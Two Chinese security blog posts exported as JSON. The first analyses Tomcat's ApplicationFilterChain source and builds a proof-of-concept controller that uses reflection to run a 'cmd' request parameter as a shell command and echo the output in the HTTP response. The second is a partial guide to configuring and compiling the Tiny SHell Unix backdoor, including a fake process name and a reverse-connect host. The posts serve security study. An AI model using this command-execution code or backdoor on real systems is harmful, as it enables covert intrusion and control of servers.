[{"title":"浅析利用Tomcat ApplicationFilterChain类实现半通用回显","date":"2021-10-18T06:57:31.000Z","path":"2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/","text":"0x00 前言之前没搞过这种半通用回显方法，学习一下。 0x01 相关概念FilterChainFilter即过滤器，是Servlet技术中最实用的技术，主要用于对用户请求进行预处理，也可以对HttpServletResponse进行后处理。Web开发人员通过Filter技术，对Web服务器管理的所有Web资源如JSP、Servlet、静态文件等进行拦截，从而实现一些特殊的功能。例如实现URL级别的权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。 Filter功能： 在HttpServletRequest到达Servlet之前，拦截客户的HttpServletRequest 。根据需要检查HttpServletRequest，也可以修改HttpServletRequest头和数据。 在HttpServletResponse到达客户端之前，拦截HttpServletResponse 。根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。 FilterChain：在一个Web应用中，可以开发编写多个Filter，这些Filter组合起来称之为一个FilterChain。Web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter，当第一个Filter的doFilter()方法被调用时，Web服务器会创建一个代表Filter链的FilterChain对象传递给该方法。在doFilter()方法中，开发人员如果调用了FilterChain对象的doFilter()方法，则Web服务器会检查FilterChain对象中是否还有Filter，如果有则调用第2个Filter，如果没有则调用目标Servlet。 Filter原理图： 而ApplicationFilterChain类则是FilterChain接口类的实现类。 ApplicationFilterChain类简介Tomcat中的ApplicationFilterChain类是一个Java Servlet API规范javax.servlet.FilterChain接口类的实现类，用于管理某个请求request的一组过滤器Filter的执行。当针对一个request所定义的一组过滤器Filter处理完该请求后，最后一个doFilter()调用才会执行目标Servlet的service()函数。之后响应对象response会按照相反的顺序依次经过这组Filter处理，最终到达客户端。 类图 创建过程ApplicationFilterChain类是在StandardWrapperValve类中invoke()方法中调用ApplicationFilterFactory.createFilterChain()方法创建的。StandardWrapperValve是Wrapper的标准阀，用在Pipleline流程中的最后一个valve执行，其中会创建ApplicationFilterChain对象并调用其doFilter()方法来处理请求，这个ApplicationFilterChain包含着配置的与请求相匹配的Filter和Servlet，其doFilter()方法会依次调用所有的Filter的doFilter()方法和Servlet的service()方法。 这里可看源码注释分析： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214public final void invoke(Request request, Response response) throws IOException, ServletException &#123; // 初始化本地变量 boolean unavailable = false; Throwable throwable = null; // This should be a Request attribute... long t1=System.currentTimeMillis(); requestCount.incrementAndGet(); // 获取StandardWrapper Container StandardWrapper wrapper = (StandardWrapper) getContainer(); Servlet servlet = null; Context context = (Context) wrapper.getParent(); // 检查标记为不可用的应用程序 if (!context.getState().isAvailable()) &#123; response.sendError(HttpServletResponse.SC_SERVICE_UNAVAILABLE, sm.getString(\"standardContext.isUnavailable\")); unavailable = true; &#125; // 检查标记为不可用的servlet if (!unavailable &amp;&amp; wrapper.isUnavailable()) &#123; container.getLogger().info(sm.getString(\"standardWrapper.isUnavailable\", wrapper.getName())); long available = wrapper.getAvailable(); if ((available &gt; 0L) &amp;&amp; (available &lt; Long.MAX_VALUE)) &#123; response.setDateHeader(\"Retry-After\", available); response.sendError(HttpServletResponse.SC_SERVICE_UNAVAILABLE, sm.getString(\"standardWrapper.isUnavailable\", wrapper.getName())); &#125; else if (available == Long.MAX_VALUE) &#123; response.sendError(HttpServletResponse.SC_NOT_FOUND, sm.getString(\"standardWrapper.notFound\", wrapper.getName())); &#125; unavailable = true; &#125; // 分配一个servlet实例来处理此请求 try &#123; if (!unavailable) &#123; // 通过Wrapper获取Servlet实例，内部已经调用了service(request, response)方法，对req与res进行了字段赋值 // 下面是对Response和Request进行后续的处理 servlet = wrapper.allocate(); &#125; &#125; catch (UnavailableException e) &#123; container.getLogger().error( sm.getString(\"standardWrapper.allocateException\", wrapper.getName()), e); long available = wrapper.getAvailable(); if ((available &gt; 0L) &amp;&amp; (available &lt; Long.MAX_VALUE)) &#123; response.setDateHeader(\"Retry-After\", available); response.sendError(HttpServletResponse.SC_SERVICE_UNAVAILABLE, sm.getString(\"standardWrapper.isUnavailable\", wrapper.getName())); &#125; else if (available == Long.MAX_VALUE) &#123; response.sendError(HttpServletResponse.SC_NOT_FOUND, sm.getString(\"standardWrapper.notFound\", wrapper.getName())); &#125; &#125; catch (ServletException e) &#123; container.getLogger().error(sm.getString(\"standardWrapper.allocateException\", wrapper.getName()), StandardWrapper.getRootCause(e)); throwable = e; exception(request, response, e); &#125; catch (Throwable e) &#123; ExceptionUtils.handleThrowable(e); container.getLogger().error(sm.getString(\"standardWrapper.allocateException\", wrapper.getName()), e); throwable = e; exception(request, response, e); servlet = null; &#125; // 设置请求相关属性 MessageBytes requestPathMB = request.getRequestPathMB(); DispatcherType dispatcherType = DispatcherType.REQUEST; if (request.getDispatcherType()==DispatcherType.ASYNC) dispatcherType = DispatcherType.ASYNC; request.setAttribute(Globals.DISPATCHER_TYPE_ATTR,dispatcherType); request.setAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR, requestPathMB); // 新建ApplicationFilterChain实例 ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); // 调用本次请求的filter chain // 注意：这里在会调用Servlet的service()函数 Container container = this.container; try &#123; if ((servlet != null) &amp;&amp; (filterChain != null)) &#123; // Swallow output if needed if (context.getSwallowOutput()) &#123; try &#123; SystemLogHandler.startCapture(); if (request.isAsyncDispatching()) &#123; request.getAsyncContextInternal().doInternalDispatch(); &#125; else &#123; filterChain.doFilter(request.getRequest(), response.getResponse()); &#125; &#125; finally &#123; String log = SystemLogHandler.stopCapture(); if (log != null &amp;&amp; log.length() &gt; 0) &#123; context.getLogger().info(log); &#125; &#125; &#125; else &#123; if (request.isAsyncDispatching()) &#123; request.getAsyncContextInternal().doInternalDispatch(); &#125; else &#123; // 调用ApplicationFilterChain实例的doFilter()函数 // 其中执行完最后一个doFilter()后会执行Servlet的service()函数 filterChain.doFilter (request.getRequest(), response.getResponse()); &#125; &#125; &#125; &#125; catch (ClientAbortException | CloseNowException e) &#123; if (container.getLogger().isDebugEnabled()) &#123; container.getLogger().debug(sm.getString( \"standardWrapper.serviceException\", wrapper.getName(), context.getName()), e); &#125; throwable = e; exception(request, response, e); &#125; catch (IOException e) &#123; container.getLogger().error(sm.getString( \"standardWrapper.serviceException\", wrapper.getName(), context.getName()), e); throwable = e; exception(request, response, e); &#125; catch (UnavailableException e) &#123; container.getLogger().error(sm.getString( \"standardWrapper.serviceException\", wrapper.getName(), context.getName()), e); // throwable = e; // exception(request, response, e); wrapper.unavailable(e); long available = wrapper.getAvailable(); if ((available &gt; 0L) &amp;&amp; (available &lt; Long.MAX_VALUE)) &#123; response.setDateHeader(\"Retry-After\", available); response.sendError(HttpServletResponse.SC_SERVICE_UNAVAILABLE, sm.getString(\"standardWrapper.isUnavailable\", wrapper.getName())); &#125; else if (available == Long.MAX_VALUE) &#123; response.sendError(HttpServletResponse.SC_NOT_FOUND, sm.getString(\"standardWrapper.notFound\", wrapper.getName())); &#125; // Do not save exception in 'throwable', because we // do not want to do exception(request, response, e) processing &#125; catch (ServletException e) &#123; Throwable rootCause = StandardWrapper.getRootCause(e); if (!(rootCause instanceof ClientAbortException)) &#123; container.getLogger().error(sm.getString( \"standardWrapper.serviceExceptionRoot\", wrapper.getName(), context.getName(), e.getMessage()), rootCause); &#125; throwable = e; exception(request, response, e); &#125; catch (Throwable e) &#123; ExceptionUtils.handleThrowable(e); container.getLogger().error(sm.getString( \"standardWrapper.serviceException\", wrapper.getName(), context.getName()), e); throwable = e; exception(request, response, e); &#125; finally &#123; // 释放本次请求的filter chain if (filterChain != null) &#123; filterChain.release(); &#125; // 释放servlet实例 try &#123; if (servlet != null) &#123; wrapper.deallocate(servlet); &#125; &#125; catch (Throwable e) &#123; ExceptionUtils.handleThrowable(e); container.getLogger().error(sm.getString(\"standardWrapper.deallocateException\", wrapper.getName()), e); if (throwable == null) &#123; throwable = e; exception(request, response, e); &#125; &#125; // If this servlet has been marked permanently unavailable, // unload it and release this instance try &#123; if ((servlet != null) &amp;&amp; (wrapper.getAvailable() == Long.MAX_VALUE)) &#123; wrapper.unload(); &#125; &#125; catch (Throwable e) &#123; ExceptionUtils.handleThrowable(e); container.getLogger().error(sm.getString(\"standardWrapper.unloadException\", wrapper.getName()), e); if (throwable == null) &#123; exception(request, response, e); &#125; &#125; long t2=System.currentTimeMillis(); long time=t2-t1; processingTime += time; if( time &gt; maxTime) maxTime=time; if( time &lt; minTime) minTime=time; &#125;&#125; 跟进看下ApplicationFilterFactory类的createFilterChain()函数的具体实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) &#123; // 如果没有servlet执行，则直接返回null if (servlet == null) return null; // 创建并初始化一个ApplicationFilterChain对象 ApplicationFilterChain filterChain = null; if (request instanceof Request) &#123; Request req = (Request) request; if (Globals.IS_SECURITY_ENABLED) &#123; // Security: Do not recycle filterChain = new ApplicationFilterChain(); &#125; else &#123; // 从请求中尝试获取FilterChain filterChain = (ApplicationFilterChain) req.getFilterChain(); // 如果获取不到，则新建ApplicationFilterChain实例并设置到请求中 if (filterChain == null) &#123; // 新建ApplicationFilterChain实例时，会先调用其静态代码来 // 初始化lastServicedRequest和lastServicedResponse为null filterChain = new ApplicationFilterChain(); req.setFilterChain(filterChain); &#125; &#125; &#125; else &#123; // 用于请求分发器的场景 filterChain = new ApplicationFilterChain(); &#125; // 为ApplicationFilterChain对象设置Servlet filterChain.setServlet(servlet); filterChain.setServletSupportsAsync(wrapper.isAsyncSupported()); // 获取当前上下文的过滤器映射关系 StandardContext context = (StandardContext) wrapper.getParent(); FilterMap filterMaps[] = context.findFilterMaps(); // 如果没有映射关系则直接返回 if ((filterMaps == null) || (filterMaps.length == 0)) return filterChain; // 获取匹配过滤器映射关系所需的信息 DispatcherType dispatcher = (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR); // 获取请求路径信息 String requestPath = null; Object attribute = request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR); if (attribute != null)&#123; requestPath = attribute.toString(); &#125; String servletName = wrapper.getName(); // 将相关请求路径映射到的过滤器添加到ApplicationFilterConfig对象中 for (FilterMap filterMap : filterMaps) &#123; if (!matchDispatcher(filterMap, dispatcher)) &#123; continue; &#125; if (!matchFiltersURL(filterMap, requestPath)) continue; ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName()); if (filterConfig == null) &#123; // FIXME - log configuration problem continue; &#125; filterChain.addFilter(filterConfig); &#125; // 接着添加与Servlet名称匹配的过滤器 for (FilterMap filterMap : filterMaps) &#123; if (!matchDispatcher(filterMap, dispatcher)) &#123; continue; &#125; if (!matchFiltersServlet(filterMap, servletName)) continue; ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName()); if (filterConfig == null) &#123; // FIXME - log configuration problem continue; &#125; filterChain.addFilter(filterConfig); &#125; // 返回最终设置好的ApplicationFilterConfig对象 return filterChain;&#125; 源码浅析这里直接从ApplicationFilterChain类源码中看注释分析： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264/** * Implementation of &lt;code&gt;javax.servlet.FilterChain&lt;/code&gt; used to manage * the execution of a set of filters for a particular request. When the * set of defined filters has all been executed, the next call to * &lt;code&gt;doFilter()&lt;/code&gt; will execute the servlet's &lt;code&gt;service()&lt;/code&gt; * method itself. * * @author Craig R. McClanahan */public final class ApplicationFilterChain implements FilterChain &#123; // Used to enforce requirements of SRV.8.2 / SRV.14.2.5.1 private static final ThreadLocal&lt;ServletRequest&gt; lastServicedRequest; private static final ThreadLocal&lt;ServletResponse&gt; lastServicedResponse; // 在ApplicationFilterChain类首次创建时调用 static &#123; // WRAP_SAME_OBJECT默认为空 if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123; lastServicedRequest = new ThreadLocal&lt;&gt;(); lastServicedResponse = new ThreadLocal&lt;&gt;(); &#125; else &#123; lastServicedRequest = null; lastServicedResponse = null; &#125; &#125; // filters数组每次扩容的增量 public static final int INCREMENT = 10; /** * Filters. */ private ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0]; // 当前执行的filter索引index private int pos = 0; // filters总量 private int n = 0; // filter之后执行的Servlet实例 private Servlet servlet = null; // 关联的servlet实例是否支持异步处理 private boolean servletSupportsAsync = false; /** * The string manager for our package. */ private static final StringManager sm = StringManager.getManager(Constants.Package); /** * Static class array used when the SecurityManager is turned on and * &lt;code&gt;doFilter&lt;/code&gt; is invoked. */ private static final Class&lt;?&gt;[] classType = new Class[]&#123; ServletRequest.class, ServletResponse.class, FilterChain.class&#125;; /** * Static class array used when the SecurityManager is turned on and * &lt;code&gt;service&lt;/code&gt; is invoked. */ private static final Class&lt;?&gt;[] classTypeUsedInService = new Class[]&#123; ServletRequest.class, ServletResponse.class&#125;; // 调用filter chain中的下一个filter，并传递指定的请求和响应。如果filter chain中没有其他filter，则调用Servlet本身的service()方法 // 该函数主要进行一层安全验证处理，再内部调用internalDoFilter()做实际处理 @Override public void doFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException &#123; // 是否开启Security Manager if( Globals.IS_SECURITY_ENABLED ) &#123; final ServletRequest req = request; final ServletResponse res = response; try &#123; java.security.AccessController.doPrivileged( (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123; // 内部调用进一步处理 internalDoFilter(req,res); return null; &#125; ); &#125; catch( PrivilegedActionException pe) &#123; Exception e = pe.getException(); if (e instanceof ServletException) throw (ServletException) e; else if (e instanceof IOException) throw (IOException) e; else if (e instanceof RuntimeException) throw (RuntimeException) e; else throw new ServletException(e.getMessage(), e); &#125; &#125; else &#123; // 内部调用进一步处理 internalDoFilter(request,response); &#125; &#125; // 实际处理的Filter方法 private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException &#123; // 调用下一个存在的filter if (pos &lt; n) &#123; // 根据pos定位找到ApplicationFilterConfig ApplicationFilterConfig filterConfig = filters[pos++]; try &#123; // 从ApplicationFilterConfig获取新的filter Filter filter = filterConfig.getFilter(); if (request.isAsyncSupported() &amp;&amp; \"false\".equalsIgnoreCase( filterConfig.getFilterDef().getAsyncSupported())) &#123; request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE); &#125; // 判断是否启用Security Manager if( Globals.IS_SECURITY_ENABLED ) &#123; final ServletRequest req = request; final ServletResponse res = response; Principal principal = ((HttpServletRequest) req).getUserPrincipal(); Object[] args = new Object[]&#123;req, res, this&#125;; SecurityUtil.doAsPrivilege (\"doFilter\", filter, classType, args, principal); &#125; else &#123; // 调用用户编写的Filter中的方法进行过滤 filter.doFilter(request, response, this); &#125; &#125; catch (IOException | ServletException | RuntimeException e) &#123; throw e; &#125; catch (Throwable e) &#123; e = ExceptionUtils.unwrapInvocationTargetException(e); ExceptionUtils.handleThrowable(e); throw new ServletException(sm.getString(\"filterChain.filter\"), e); &#125; return; &#125; // filter chain执行完后，调用servlet实例 try &#123; // 保存Servlet执行前的request与response，前提是WRAP_SAME_OBJECT不为空 if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123; lastServicedRequest.set(request); lastServicedResponse.set(response); &#125; if (request.isAsyncSupported() &amp;&amp; !servletSupportsAsync) &#123; request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE); &#125; // Use potentially wrapped request from this point if ((request instanceof HttpServletRequest) &amp;&amp; (response instanceof HttpServletResponse) &amp;&amp; Globals.IS_SECURITY_ENABLED ) &#123; final ServletRequest req = request; final ServletResponse res = response; Principal principal = ((HttpServletRequest) req).getUserPrincipal(); Object[] args = new Object[]&#123;req, res&#125;; SecurityUtil.doAsPrivilege(\"service\", servlet, classTypeUsedInService, args, principal); &#125; else &#123; // servlet实例的service()方法调用 servlet.service(request, response); &#125; &#125; catch (IOException | ServletException | RuntimeException e) &#123; throw e; &#125; catch (Throwable e) &#123; e = ExceptionUtils.unwrapInvocationTargetException(e); ExceptionUtils.handleThrowable(e); throw new ServletException(sm.getString(\"filterChain.servlet\"), e); &#125; finally &#123; if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123; lastServicedRequest.set(null); lastServicedResponse.set(null); &#125; &#125; &#125; // 获取最后一个从当前线程传递到servlet进行服务的请求 public static ServletRequest getLastServicedRequest() &#123; return lastServicedRequest.get(); &#125; // 获取最后一个从当前线程传递到servlet进行服务的响应 public static ServletResponse getLastServicedResponse() &#123; return lastServicedResponse.get(); &#125; // 添加filter到filter chain void addFilter(ApplicationFilterConfig filterConfig) &#123; // 防止添加重复的filter for(ApplicationFilterConfig filter:filters) if(filter==filterConfig) return; // 如果filters数量满额 if (n == filters.length) &#123; // 以INCREMENT为单位扩容 ApplicationFilterConfig[] newFilters = new ApplicationFilterConfig[n + INCREMENT]; // 数组内容copy System.arraycopy(filters, 0, newFilters, 0, n); // 引用替换 filters = newFilters; &#125; // 扩容后再添加新的filter filters[n++] = filterConfig; &#125; /** * Release references to the filters and wrapper executed by this chain. */ void release() &#123; for (int i = 0; i &lt; n; i++) &#123; filters[i] = null; &#125; n = 0; pos = 0; servlet = null; servletSupportsAsync = false; &#125; /** * Prepare for reuse of the filters and wrapper executed by this chain. */ void reuse() &#123; pos = 0; &#125; // 设置filter chain之后将执行的Servlet void setServlet(Servlet servlet) &#123; this.servlet = servlet; &#125; // 设置Servlet支持异步 void setServletSupportsAsync(boolean servletSupportsAsync) &#123; this.servletSupportsAsync = servletSupportsAsync; &#125; // 查找不支持异步的filter public void findNonAsyncFilters(Set&lt;String&gt; result) &#123; for (int i = 0; i &lt; n ; i++) &#123; ApplicationFilterConfig filter = filters[i]; if (\"false\".equalsIgnoreCase(filter.getFilterDef().getAsyncSupported())) &#123; result.add(filter.getFilterClass()); &#125; &#125; &#125;&#125; 看完代码，我们可以简介归纳一个ApplicationFilterChain对象包含几个主要参数： n：filter个数； pos：下一个要执行的filter的位置； Servlet：当pos=n即过滤完成时，调用Servlet的service()方法，把请求交给Servlet； filters：Filter的相关配置信息； 所以，ApplicationFilterChain对象的执行其实就是通过pos作为索引来逐个执行设置的filter的doFilter()函数，执行完所有filter的doFilter()后，就会调用Servlet的service()函数来处理请求。 0x02 回显利用基本原理一般的，基于Tomcat的回显利用实现思路如下： Tomcat中存在保存Request和Response的某些变量； 通过读取Request对象来获取输入的命令参数； 通过写入Response对象来实现响应回显输出； 而在前面分析的ApplicationFilterChain类中，我们看到在调用internalDoFilter()函数时，Request和Response是保存到lastServicedRequest和lastServicedResponse变量中的： 123456// We fell off the end of the chain -- call the servlet instancetry &#123; if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123; lastServicedRequest.set(request); lastServicedResponse.set(response); &#125; 而这两个变量是由private static final修饰的ThreadLocal类型的变量，static使得可以直接在没有创建对象的情况下来获取变量，ThreadLocal的作用主要是做数据隔离，填充的数据只属于当前线程，变量的数据对别的线程而言是相对隔离的，在多线程环境下，如何防止自己的变量被其它线程篡改： 123// Used to enforce requirements of SRV.8.2 / SRV.14.2.5.1private static final ThreadLocal&lt;ServletRequest&gt; lastServicedRequest;private static final ThreadLocal&lt;ServletResponse&gt; lastServicedResponse; 下面具体看看怎么实现回显。 代码实现本地起个简易的Spring Boot，其中Controller代码如下，尝试获取当前HttpServletResponse内容和输入的input参数： 123456789@ResponseBody@RequestMapping(\"/test\")public String test(String input, HttpServletResponse httpServletResponse) throws Exception &#123; System.out.println(httpServletResponse); if (input == null) &#123; input = \"Echo Page\"; &#125; return input;&#125; 调试看调用栈，该Response实例在函数调用栈中始终是同一个传递下来的： 这里理一下，我们的目标是要在本Controller的响应中添加命令执行的回显到页面中。 在前面的源码浅析中，我们知道ApplicationFilterChain这个类的internalDoFilter()函数中，会将当前的ServletRequest和ServletResponse保存到其成员变量lastServicedRequest和lastServicedResponse中，当然前提是ApplicationDispatcher.WRAP_SAME_OBJECT为true（默认为false）： 看到WRAP_SAME_OBJECT是个static final变量，问题不大，可以通过反射来修改其值为true，从而使得程序能跑到if逻辑中让当前的ServletRequest和ServletResponse保存到lastServicedRequest和lastServicedResponse中。 具体怎么修改可以参考网上的文章：利用反射修改final数据域 先尝试写了下，代码说明如注释： 123456789101112131415161718192021222324252627282930313233343536@ResponseBody@RequestMapping(\"/test\")public String test(String input, HttpServletResponse httpServletResponse) throws Exception &#123; System.out.println(httpServletResponse); if (input == null) &#123; input = \"Echo Page\"; &#125; // 获取ApplicationDispatcher类的声明字段WRAP_SAME_OBJECT Field WRAP_SAME_OBJECT_FIELD = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\").getDeclaredField(\"WRAP_SAME_OBJECT\"); // 获取Field类的声明字段modifiers Field modifiersField = Field.class.getDeclaredField(\"modifiers\"); // 添加访问权限才能访问私有属性 WRAP_SAME_OBJECT_FIELD.setAccessible(true); modifiersField.setAccessible(true); // 清除代表final的那个bit modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp;~ Modifier.FINAL); // 获取当前WRAP_SAME_OBJECT_FIELD的值 boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null); // 如果WRAP_SAME_OBJECT_FIELD值为false，说明是第一次调用、还未进行反射修改 if (!WRAP_SAME_OBJECT) &#123; System.out.println(\"[*]通过反射机制来修改WRAP_SAME_OBJECT的值为true\"); // 修改WRAP_SAME_OBJECT为true，才能反射修改到lastServicedRequest和lastServicedResponse WRAP_SAME_OBJECT_FIELD.setBoolean(null, true); &#125; else &#123; System.out.println(\"[*]WRAP_SAME_OBJECT的值已为true\"); &#125; return input;&#125; 直接跑之后控制台报如下错： 原因在于执行完Servlet的service()函数修改了WRAP_SAME_OBJECT为true后会进入下面的finally逻辑，其中会设置lastServicedRequest和lastServicedResponse两个变量值为null，但是这两个变量在默认情况下是null、并没有被新建： 根据这个错误信息，我们需要在代码中也新建lastServicedRequest和lastServicedResponse这两个实例，这样代码就没问题了。同时，还得加入获取URL参数并执行的代码，最后添加到Response中回显输出。看代码注释即可： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192@ResponseBody@RequestMapping(\"/test\")public String test(String input, HttpServletResponse httpServletResponse) throws Exception &#123; System.out.println(httpServletResponse); if (input == null) &#123; input = \"Echo Page\"; &#125; // 获取ApplicationDispatcher类的WRAP_SAME_OBJECT声明字段 // 和ApplicationFilterChain类的lastServicedRequest与lastServicedResponse声明字段 Field WRAP_SAME_OBJECT_FIELD = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\").getDeclaredField(\"WRAP_SAME_OBJECT\"); Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(\"lastServicedRequest\"); Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(\"lastServicedResponse\"); // 获取Field类的modifiers声明字段 Field modifiersField = Field.class.getDeclaredField(\"modifiers\"); // 添加访问权限才能访问私有属性 WRAP_SAME_OBJECT_FIELD.setAccessible(true); modifiersField.setAccessible(true); lastServicedRequestField.setAccessible(true); lastServicedResponseField.setAccessible(true); // 清除代表final的那个bit，才能成功修改static final modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp;~ Modifier.FINAL); modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp;~ Modifier.FINAL); modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp;~ Modifier.FINAL); // 获取当前WRAP_SAME_OBJECT_FIELD的值 boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null); // 尝试获取当前lastServicedRequest和lastServicedResponse的值 // 如果不是第一次访问该接口则为非null ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(null); ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(null); // 非null就可以直接获取URL参数cmd String cmd = lastServicedRequest != null ? lastServicedRequest.get().getParameter(\"cmd\") : null; if (cmd != null) &#123; System.out.println(\"[*]获取到请求的cmd参数: \" + cmd); &#125; // 如果WRAP_SAME_OBJECT_FIELD值为false，说明是第一次调用、还未进行反射修改 // 也未新建lastServicedRequest与lastServicedResponse实例 if (!WRAP_SAME_OBJECT || lastServicedRequest == null || lastServicedResponse == null) &#123; System.out.println(\"[*]通过反射机制来修改WRAP_SAME_OBJECT的值为true\"); // 修改WRAP_SAME_OBJECT为true，才能反射修改到lastServicedRequest和lastServicedResponse WRAP_SAME_OBJECT_FIELD.setBoolean(null, true); // 新建lastServicedRequest和lastServicedResponse实例，避免默认null导致报错 lastServicedRequestField.set(null, new ThreadLocal&lt;&gt;()); lastServicedResponseField.set(null, new ThreadLocal&lt;&gt;()); &#125; else if (cmd != null) &#123; // 执行cmd命令并添加到Response中回显 System.out.println(\"[*]WRAP_SAME_OBJECT的值已为true且存在cmd参数\"); // 获取保存到lastServicedResponse中的ServletResponse ServletResponse servletResponse = lastServicedResponse.get(); PrintWriter printWriter = servletResponse.getWriter(); // 获取ResponseFacade类的response声明字段，通过其获取ServletResponse里的Response对象 Field responseField = ResponseFacade.class.getDeclaredField(\"response\"); responseField.setAccessible(true); Response response = (Response) responseField.get(servletResponse); // 反射修改Response对象的usingWriter声明字段为false // 不加这段代码也能成功回显命令执行结果，但会报错显示当前Response已调用getWriter() // 这是因为后续会调用Response的getOutputStream()，该函数和getWriter()是互相排斥的 // 但可通过反射修改usingWriter标志使得程序认为未调用getWriter()而跳过抛出异常的逻辑 Field usingWriterField = Response.class.getDeclaredField(\"usingWriter\"); usingWriterField.setAccessible(true); usingWriterField.set(response, Boolean.FALSE); // 判断当前OS类型 boolean isLinux = true; String osType = System.getProperty(\"os.name\"); if (osType != null &amp;&amp; osType.toLowerCase().contains(\"win\")) &#123; isLinux = false; &#125; // 执行命令并将结果写入ServletResponse的PrintWriter中 String[] cmds = isLinux ? new String[]&#123;\"sh\", \"-c\", cmd&#125; : new String[]&#123;\"cmd.exe\", \"/c\", cmd&#125;; InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner scanner = new Scanner(inputStream).useDelimiter(\"\\\\a\"); String output = scanner.hasNext() ? scanner.next() : \"\"; printWriter.write(output); printWriter.flush(); &#125; return input;&#125; 如代码所示，访问两次就出回显了： 半通用的原因利用Tomcat ApplicationFilterChain类实现回显利用的方式之所以说是半通用，这是因为在Shiro中并不可行。原因在于，ApplicationFilterChain类中Request和Response的设置是在Shiro反序列化漏洞触发点之后。 这里看到在调用ApplicationFilterChain类的internalDoFilter()函数时，调用到了Shiro的ShiroFilter过滤器类、其中会调用到CookieRememberMeManager类的getRememberedSerializedIdentity()函数来获取cookie内容并进行反序列化操作，这个过程都是还在调用应用的doFilter()的时候就触发了，而间于Filter Chain执行之后、调用Servlet实例之前的Request和Response的设置就不起作用了： 0x03 参考Tomcat中一种半通用回显方法","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Tomcat","slug":"Tomcat","permalink":"https://www.mi1k7ea.com/tags/Tomcat/"}]},{"title":"Unix后门Tiny SHell工具浅析","date":"2021-09-27T02:06:08.000Z","path":"2021/09/27/Unix后门Tiny-SHell工具浅析/","text":"0x00 TSH简介Tiny SHell即TSH是Orange于8年前开发的一款开源的UNIX后门工具，由C编写，体积Tiny。 支持功能： 正向/反向连接模式； 文件传输； 加密通信； 地址：https://github.com/orangetw/tsh 0x01 工具使用下载： 1git clone https://github.com/orangetw/tsh.git 修改tsh.h文件，主要修改密钥和控制端地址（如果使用反向连接）： 12345678910111213141516#ifndef _TSH_H#define _TSH_Hchar *secret = \"replace with your password\";#define SERVER_PORT 7586#define FAKE_PROC_NAME \"/bin/bash\"#define CONNECT_BACK_HOST \"localhost\"#define CONNECT_BACK_DELAY 30#define GET_FILE 1#define PUT_FILE 2#define RUNSHELL 3#endif /* tsh.h */ 参数说明： secret：用于加密控制端和被控端之间通信的数据，这里所有通信都经过AES加密处理，密钥的长度任意（最好大于12，更安全）； SERVER_PORT：服务端监听端口号； FAKE_PROC_NAME：用于伪装显示后门运行后的进程名字（用ps -ef或者netstat查看显示的进程名字）； CONNECT_BACK_HOST：控制端地址； CONNECT_BACK_DELAY：连接延时，默认延时单位为秒； 编译，参数从linux, freebsd, openbsd, netbsd, cygwin, sunos, irix, hpux, osf中选择，我本地环境为linux： 1make linux 编译完成后，在当前目录中会生成tsh和tshd两个文件。 反向连接前提准备是在编译前将tsh.h文件中的CONNECT_BACK_HOST设置为反向连接的控制端地址后再进行编译操作： 12#define CONNECT_BACK_HOST \"控制端地址\"#define CONNECT_BACK_DELAY 30 